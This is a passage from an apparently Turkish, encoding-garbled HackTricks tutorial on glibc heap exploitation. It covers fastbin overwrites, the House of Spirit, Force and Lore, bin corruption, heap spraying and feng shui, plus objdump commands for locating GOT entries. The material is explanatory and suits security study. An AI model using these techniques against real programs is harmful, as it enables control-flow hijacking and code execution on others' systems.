Bu durumda, size alanÄ±na 8 + NON\_MAIN\_ARENA + PREV\_INUSE boyutunu koyarsak, fastbin\_index() bize fastbins\[-1]'i dÃ¶ndÃ¼recektir, bu da av->max\_fast'e iÅŸaret edecektir.

Bu durumda av->max\_fast'in Ã¼zerine yazÄ±lacak (iÅŸaret edilen deÄŸil, Ã¼zerine yazÄ±lacak olan pozisyon) adres olacaktÄ±r.

AyrÄ±ca, serbest bÄ±rakÄ±lan parÃ§anÄ±n bitiÅŸik parÃ§asÄ±nÄ±n 8'den bÃ¼yÃ¼k olmasÄ± gerekir -> Serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunun 8 olduÄŸunu sÃ¶ylediÄŸimize gÃ¶re, bu sahte parÃ§aya sadece 8'den bÃ¼yÃ¼k bir boyut koymamÄ±z yeterlidir (ayrÄ±ca shellcode serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±ndan, baÅŸlangÄ±Ã§ta noplara dÃ¼ÅŸen bir jmp koymamÄ±z gerekecek).

AyrÄ±ca, aynÄ± sahte parÃ§anÄ±n av->system\_mem'den kÃ¼Ã§Ã¼k olmasÄ± gerekir. av->system\_mem 1848 bayt daha ileridedir.

\_DTOR\_END\_ ve GOT'taki az sayÄ±da adres nedeniyle, bu bÃ¶lÃ¼mlerin hiÃ§biri Ã¼zerine yazÄ±lacak uygun bir adres deÄŸildir, bu yÃ¼zden yÄ±ÄŸÄ±nÄ± hedeflemek iÃ§in fastbin'i nasÄ±l uygulayacaÄŸÄ±mÄ±za bakalÄ±m.

BaÅŸka bir saldÄ±rÄ± ÅŸekli, **av**'yi yÄ±ÄŸÄ±nÄ± hedeflemek iÃ§in yeniden yÃ¶nlendirmektir.

Size'Ä± 8 yerine 16 yapacak ÅŸekilde deÄŸiÅŸtirirsek: fastbin\_index() bize fastbins\[0]'Ä± dÃ¶ndÃ¼recektir ve bunu yÄ±ÄŸÄ±nÄ± hedeflemek iÃ§in kullanabiliriz.

Bunun iÃ§in yÄ±ÄŸÄ±nda canary veya garip deÄŸerler olmamalÄ±dÄ±r, aslÄ±nda ÅŸu durumda olmalÄ±dÄ±r: 4 bayt null + EBP + RET

4 bayt null, **av**'nin bu adrese iÅŸaret edeceÄŸi ve bir **av**'nin ilk Ã¶ÄŸesinin 0 olmasÄ± gereken bir adrestir.

**av->max\_fast** EBP olacak ve bize kÄ±sÄ±tlamalarÄ± atlamak iÃ§in hizmet edecek bir deÄŸer olacaktÄ±r.

**av->fastbins\[0]** adresi **p**'nin adresiyle Ã¼zerine yazÄ±lacak ve RET olacak, bÃ¶ylece shellcode'a atlanacaktÄ±r.

AyrÄ±ca, **av->system\_mem**'de (yÄ±ÄŸÄ±nÄ±n pozisyonundan 1484 bayt yukarÄ±da) bizi atlamamÄ±zÄ± saÄŸlayacak yeterince Ã§Ã¶p olacaktÄ±r.

AyrÄ±ca, serbest bÄ±rakÄ±lan parÃ§anÄ±n bitiÅŸik parÃ§asÄ±nÄ±n 8'den bÃ¼yÃ¼k olmasÄ± gerekir -> Serbest bÄ±rakÄ±lan parÃ§anÄ±n boyutunun 16 olduÄŸunu sÃ¶ylediÄŸimize gÃ¶re, bu sahte parÃ§aya sadece 8'den bÃ¼yÃ¼k bir boyut koymamÄ±z yeterlidir (ayrÄ±ca shellcode serbest bÄ±rakÄ±lan parÃ§ada olacaÄŸÄ±ndan, yeni sahte parÃ§anÄ±n boyut alanÄ±nÄ±n sonrasÄ±nda gelen noplara dÃ¼ÅŸen bir jmp koymamÄ±z gerekecek).

**The House of Spirit**

Bu durumda, saldÄ±rganÄ±n deÄŸiÅŸtirebileceÄŸi bir malloc iÅŸaretÃ§isine sahip bir malloc iÅŸaretÃ§isi arÄ±yoruz (Ã¶rneÄŸin, iÅŸaretÃ§inin bir deÄŸiÅŸken Ã¼zerine taÅŸma olasÄ±lÄ±ÄŸÄ± olan yÄ±ÄŸÄ±nÄ±n altÄ±nda olmasÄ±).

BÃ¶ylece bu iÅŸaretÃ§iyi istediÄŸi yere iÅŸaret edebiliriz. Ancak, herhangi bir yer uygun deÄŸildir, sahte parÃ§anÄ±n boyutu av->max\_fast'ten kÃ¼Ã§Ã¼k olmalÄ± ve daha spesifik olarak gelecekteki bir malloc() Ã§aÄŸrÄ±sÄ±nda talep edilen boyut + 8'e eÅŸit olmalÄ±dÄ±r. Bu nedenle, eÄŸer bu savunmasÄ±z iÅŸaretÃ§inin altÄ±nda malloc(40) Ã§aÄŸrÄ±lacaÄŸÄ±nÄ± biliyorsak, sahte parÃ§anÄ±n boyutu 48 olmalÄ±dÄ±r.

Ã–rneÄŸin, program kullanÄ±cÄ±dan bir sayÄ± istediÄŸinde 48 girebilir ve malloc iÅŸaretÃ§isini deÄŸiÅŸtirilebilir hale getirerek malloc'a ait olabilecek 4 bayt sonraki adreslere iÅŸaret edebiliriz (ÅŸans eseri EBP'ye ait olabilir, bÃ¶ylece 48 arkada kalÄ±r, sanki baÅŸlÄ±k boyutuymuÅŸ gibi). AyrÄ±ca, ptr-4+48 adresinin (bu durumda ptr=EBP) birkaÃ§ koÅŸulu karÅŸÄ±lamasÄ± gerekir, yani 8 < ptr-4+48 < av->system\_mem olmalÄ±dÄ±r.

Bu koÅŸullar saÄŸlandÄ±ÄŸÄ±nda, dediÄŸimiz gibi, bir sonraki malloc(40) Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda EBP'nin adresi atanÄ±r. SaldÄ±rganÄ±n bu malloc'a ne yazacaÄŸÄ±nÄ± da kontrol edebiliyorsa, EBP ve EIP'yi istediÄŸi adrese Ã¼zerine yazabilir.

Bu, Ã§Ã¼nkÃ¼ free() iÅŸlemi, yÄ±ÄŸÄ±nÄ±n EBP'sine iÅŸaret eden adreste yeni bir malloc() iÃ§in mÃ¼kemmel boyutta bir parÃ§a olduÄŸunu kaydeder, bu nedenle o adrese atar.

**The House of Force**

Gereksinimler:

* Wilderness'Ä± Ã¼zerine yazabilecek bir taÅŸma
* KullanÄ±cÄ± tarafÄ±ndan tanÄ±mlanan boyutta bir malloc() Ã§aÄŸrÄ±sÄ±
* KullanÄ±cÄ± tarafÄ±ndan tanÄ±mlanan verilere sahip bir malloc() Ã§aÄŸrÄ±sÄ±

Ä°lk olarak, wilderness parÃ§asÄ±nÄ±n boyutunu Ã§ok bÃ¼yÃ¼k bir deÄŸerle (0xffffffff) Ã¼zerine yazÄ±yoruz, bÃ¶ylece yeterince bÃ¼yÃ¼k bir bellek talebi \_int\_malloc() tarafÄ±ndan heap'i geniÅŸletmeden iÅŸlenecektir.

Ä°kincisi, av->top'u, saldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bir bellek bÃ¶lgesine, Ã¶rneÄŸin yÄ±ÄŸÄ±n, iÅŸaret edecek ÅŸekilde deÄŸiÅŸtiriyoruz. av->top'a \&EIP - 8 konulur.

SaldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki bellek bÃ¶lgesine iÅŸaret eden av->top'u deÄŸiÅŸtirmemiz gerekiyor:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim, mevcut wilderness parÃ§asÄ±nÄ±n adresini (mevcut av->top) alÄ±r ve remainder tam olarak bu adresin malloc() tarafÄ±ndan talep edilen bayt sayÄ±sÄ± kadar ilerisine denk gelir. Yani, \&EIP-8'in 0xbffff224 olduÄŸu ve av->top'un 0x080c2788 olduÄŸu durumda, av->top'un bir sonraki malloc() iÃ§in \&EIP-8'e iÅŸaret etmesi gereken miktardÄ±r:

0xbffff224 - 0x080c2788 = 3086207644.

Bu ÅŸekilde deÄŸiÅŸtirilmiÅŸ deÄŸeri av->top'a kaydedilir ve bir sonraki malloc EIP'ye iÅŸaret eder ve Ã¼zerine yazÄ±labilir.

Yeni wilderness parÃ§asÄ±nÄ±n boyutunun, son malloc() tarafÄ±ndan yapÄ±lan talepten daha bÃ¼yÃ¼k olmasÄ± Ã¶nemlidir. Yani, wilderness \&EIP-8'e iÅŸaret ediyorsa, boyut tam olarak yÄ±ÄŸÄ±nÄ±n EBP alanÄ±nda kalÄ±r.

**The House of Lore**

**SmallBin BozulmasÄ±**

Serbest bÄ±rakÄ±lan parÃ§alar, boyutlarÄ±na gÃ¶re bir bine yerleÅŸtirilir. Ancak, unsorted bins'e Ã¶nce yerleÅŸtirilirler. Bir parÃ§a serbest bÄ±rakÄ±ldÄ±ÄŸÄ±nda hemen bine konulmaz, unsorted bins'te kalÄ±r. Sonra, yeni bir parÃ§a rezerve edilirse ve Ã¶nceki serbest bÄ±rakÄ±lan parÃ§a ona hizmet edebilirse, geri verilir, ancak daha bÃ¼yÃ¼k bir parÃ§a rezerve edilirse, unsorted bins'teki serbest bÄ±rakÄ±lan parÃ§a uygun binine konulur.

ZararlÄ± kodu ulaÅŸmak iÃ§in bellek talebi av->max\_fast'ten bÃ¼yÃ¼k (genellikle 72) ve MIN\_LARGE\_SIZE'dan (512) kÃ¼Ã§Ã¼k olmalÄ±dÄ±r.
Binlerde istenilen boyutta bir parÃ§a varsa, onu Ã§Ã¶zÃ¼mlendikten sonra geri dÃ¶ndÃ¼rÃ¼lÃ¼r:

bck = victim->bk; Ã–nceki parÃ§aya iÅŸaret eder, deÄŸiÅŸtirebileceÄŸimiz tek bilgidir.

bin->bk = bck; Ã–nceki parÃ§a, son parÃ§a olur, bck'nin bir sonraki rezerve edilen parÃ§aya iÅŸaret etmesi durumunda bu adres verilir.

bck->fd = bin; Bu parÃ§ayÄ± bin'e iÅŸaret ederek liste kapatÄ±lÄ±r.

Gereksinimler:

Ä°lk olarak iki malloc rezerve edilmelidir, bÃ¶ylece ikinci parÃ§a serbest bÄ±rakÄ±ldÄ±ktan sonra ilkine taÅŸma yapÄ±labilir (yani taÅŸmadan Ã¶nce ikinci parÃ§adan daha bÃ¼yÃ¼k bir malloc rezerve edilmiÅŸ olmalÄ±dÄ±r)

SaldÄ±rgan tarafÄ±ndan kontrol edilen bir adrese sahip olmasÄ± gereken saldÄ±rgan tarafÄ±ndan seÃ§ilen malloc rezerv edilen parÃ§a.

AmacÄ±mÄ±z ÅŸudur, bir heap'e taÅŸma yapabilirsek ve altÄ±nda serbest bÄ±rakÄ±lmÄ±ÅŸ ve bin'inde bir parÃ§asÄ± olan bir heap'e taÅŸma yapabilirsek, bk iÅŸaretÃ§isini deÄŸiÅŸtirebiliriz. Bk iÅŸaretÃ§isini deÄŸiÅŸtirirsek ve bu parÃ§a bin listesinin ilk parÃ§asÄ± haline gelirse ve rezerve edilirse, bin aldatÄ±lacak ve listenin son parÃ§asÄ±nÄ±n (sunulan sonraki parÃ§a) yanlÄ±ÅŸ adresinde olduÄŸuna inandÄ±rÄ±lacaktÄ±r (Ã¶rneÄŸin stack veya GOT'a). Bu nedenle, baÅŸka bir parÃ§a rezerve edildiÄŸinde ve saldÄ±rganÄ±n izinleri varsa, istenen konumda bir parÃ§a verilecek ve oraya yazabilecektir.

DeÄŸiÅŸtirilen parÃ§anÄ±n serbest bÄ±rakÄ±lmasÄ±ndan sonra serbest bÄ±rakÄ±lan parÃ§adan daha bÃ¼yÃ¼k bir parÃ§a rezerve edilmesi gerekmektedir, bÃ¶ylece deÄŸiÅŸtirilen parÃ§a sÄ±ralanmamÄ±ÅŸ bin'lerden Ã§Ä±kar ve bin'ine yerleÅŸtirilir.

Bin'ine yerleÅŸtirildikten sonra, taÅŸma yoluyla bk iÅŸaretÃ§isini deÄŸiÅŸtirmek iÃ§in zamanÄ± gelir, bÃ¶ylece bin, malloc() Ã§aÄŸrÄ±ldÄ±ÄŸÄ±nda yeterince kez bin'in deÄŸiÅŸtirilmiÅŸ bin'ini kullanmasÄ±nÄ± bekler ve bin'i yanlÄ±ÅŸ adresindeki bir sonraki parÃ§anÄ±n olduÄŸuna inandÄ±rÄ±r. Ve ardÄ±ndan istediÄŸimiz parÃ§a verilir.

Bu saldÄ±rÄ±nÄ±n mÃ¼mkÃ¼n olan en kÄ±sa sÃ¼rede gerÃ§ekleÅŸmesi iÃ§in ideal olan ÅŸey: ZayÄ±f parÃ§a rezervasyonu, deÄŸiÅŸtirilecek parÃ§a rezervasyonu, bu parÃ§a serbest bÄ±rakÄ±lÄ±r, deÄŸiÅŸtirilecek parÃ§adan daha bÃ¼yÃ¼k bir parÃ§a rezerve edilir, parÃ§a deÄŸiÅŸtirilir (zayÄ±flÄ±k), zayÄ±f parÃ§adan aynÄ± boyutta bir parÃ§a rezerve edilir ve istenilen adrese iÅŸaret eden ikinci bir parÃ§a rezerve edilir.

Bu saldÄ±rÄ±yÄ± korumak iÃ§in, parÃ§anÄ±n "yanlÄ±ÅŸ" olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in tipik bir kontrol kullanÄ±lmÄ±ÅŸtÄ±r: bck->fd'nin victim'a iÅŸaret ettiÄŸi kontrol edilir. Yani, bizim durumumuzda, stack'te yanlÄ±ÅŸ olarak iÅŸaretlenen parÃ§anÄ±n fd\* iÅŸaretÃ§isinin victim'a iÅŸaret edip etmediÄŸi kontrol edilir. Bu korumayÄ± aÅŸmak iÃ§in saldÄ±rganÄ±n, uygun adrese (muhtemelen stack Ã¼zerinden) victim'un adresini yazabilmesi gerekir. BÃ¶ylece bir gerÃ§ek parÃ§a gibi gÃ¶rÃ¼nÃ¼r.

**BÃ¼yÃ¼k Bin BozulmasÄ±**

Ã–nceki gereksinimlerin yanÄ± sÄ±ra, rezerve edilen parÃ§alarÄ±n 512'den bÃ¼yÃ¼k olmasÄ± gerekmektedir.

SaldÄ±rÄ±, Ã¶ncekiyle aynÄ±dÄ±r, yani bk iÅŸaretÃ§isini deÄŸiÅŸtirmek gereklidir ve tÃ¼m bu malloc() Ã§aÄŸrÄ±larÄ±na ihtiyaÃ§ vardÄ±r, ancak deÄŸiÅŸtirilen parÃ§anÄ±n boyutunu deÄŸiÅŸtirmek gereklidir, bÃ¶ylece bu boyut - nb < MINSIZE olur.

Ã–rneÄŸin, 1552 boyutunda bir parÃ§a koymak, 1552 - 1544 = 8 < MINSIZE olacak ÅŸekilde ayarlanÄ±r (negatif olmamalÄ±dÄ±r Ã§Ã¼nkÃ¼ unsigned karÅŸÄ±laÅŸtÄ±rÄ±lÄ±r).

AyrÄ±ca, daha da karmaÅŸÄ±k hale getirmek iÃ§in bir yama eklenmiÅŸtir.

**Heap Spreyi**

Temelde, heap'ler iÃ§in mÃ¼mkÃ¼n olan tÃ¼m belleÄŸi rezerve etmek ve bunlarÄ± bir shellcode ile bitirilmiÅŸ bir nops yataÄŸÄ± ile doldurmaktÄ±r. AyrÄ±ca, yatak olarak 0x0c kullanÄ±lÄ±r. Yani, 0x0c0c0c0c adresine atlamaya Ã§alÄ±ÅŸÄ±lacak ve bÃ¶ylece bu yataÄŸa Ã§aÄŸrÄ±lacak bir adres Ã¼zerine yazÄ±lÄ±rsa oraya atlanacaktÄ±r. Temel olarak taktik, birÃ§ok ÅŸeyi rezerve etmektir, bÃ¶ylece bir iÅŸaretÃ§i Ã¼zerine yazÄ±lÄ±p yazÄ±lmadÄ±ÄŸÄ±nÄ± gÃ¶rmek ve 0x0c0c0c0c adresine atlamak iÃ§in beklemektir, umarÄ±m orada nops olacaktÄ±r.

**Heap Feng Shui**

BelleÄŸi sementlemek iÃ§in rezervasyonlar ve serbest bÄ±rakmalar aracÄ±lÄ±ÄŸÄ±yla parÃ§alar arasÄ±nda rezerve edilmiÅŸ parÃ§alarÄ±n kaldÄ±ÄŸÄ± ÅŸekilde dÃ¼zenlemeyi iÃ§erir. TaÅŸma yapÄ±lacak tampon bir yumurtanÄ±n iÃ§ine yerleÅŸtirilir.

**objdump -d yÃ¼rÃ¼tÃ¼lebilir** â€”> FonksiyonlarÄ± ayrÄ±ÅŸtÄ±rÄ±r\
**objdump -d ./PROGRAMA | grep FONKSIYON** â€”> Fonksiyon adresini alÄ±r\
**objdump -d -Mintel ./shellcodeout** â€”> Shellcode'un bizim olduÄŸunu ve OpCodes'leri almak iÃ§in\
**objdump -t ./exec | grep varBss** â€”> Sembol tablosu, deÄŸiÅŸkenlerin ve fonksiyonlarÄ±n adreslerini almak iÃ§in\
**objdump -TR ./exec | grep exit(func lib)** â€”> KÃ¼tÃ¼phane fonksiyonlarÄ±nÄ±n adreslerini almak iÃ§in (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** â€”> GOT'ta Ã¼zerine yazÄ±lacak puts adresini alÄ±r\
**objdump -D ./exec** â€”> TÃ¼mÃ¼nÃ¼ ayrÄ±ÅŸtÄ±rÄ±r plt giriÅŸlerine kadar\
**objdump -p -/exec**\
**Info functions strncmp â€”>** gdb'de fonksiyon hakkÄ±nda bilgi

## Ä°lginÃ§ Kurslar

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referanslar**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keÅŸfedin**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da takip edin ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek destekleyin.**

</details>
